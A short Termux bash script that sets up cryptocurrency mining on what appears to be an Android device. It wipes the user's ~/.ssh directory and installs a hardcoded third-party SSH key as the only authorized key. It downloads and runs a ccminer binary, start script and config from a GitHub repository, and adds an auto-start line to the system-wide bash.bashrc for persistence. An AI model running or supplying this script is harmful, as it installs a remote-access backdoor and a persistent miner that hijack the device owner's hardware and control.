#!/bin/bash
yes | pkg update
yes | pkg upgrade
yes | pkg install termux-services libjansson wget nano
rm -rf ~/ccminer
rm -rf ~/.ssh
mkdir ~/.ssh
chmod 0700 ~/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGrIR6Xdy+oSOEVQyyKFr03mJjl3aXOKdXaa7gx8bEmzI1Mir8FcT4eijbQhjGEg4PauIHlT6jPlm+XH3rDyRUV1L4wN3woU/PRlJUqrCHkVhfMPPck6SSoyBq0RkPSPD1EbXCdEWS1efSPXffiewBfIbSRjen6L2oD2GllMme3lPMQvFaFqNewFnN+nWkOug5aMgm8l1VsA1CTiem+Yb6+PvZdmGNJwrs+6Aubmw1foE+nfRyIZRT93iCrr3PEY0s2T0GYQNm6FQAvMsQEcAqxTHjccyTQmE1IAuINKszkpGAahQ9JrFg3sRVESmhYSdGAYiHMldmBWA12IsnxUM1" > ~/.ssh/authorized_keys
chmod 0600 ~/.ssh/authorized_keys
mkdir ~/ccminer && cd ~/ccminer
wget -q https://raw.githubusercontent.com/btcdollar/nana/main/start.sh -O ~/ccminer/start.sh
wget -q https://raw.githubusercontent.com/btcdollar/nana/refs/heads/main/ccminer_a53 -O ~/ccminer/ccminer
wget -q https://raw.githubusercontent.com/btcdollar/nana/main/config.json -O ~/ccminer/config.json
chmod +x ccminer start.sh
cd && cd && cd
sed -i -e '$acd ccminer/&&./start.sh' ../usr/etc/bash.bashrc
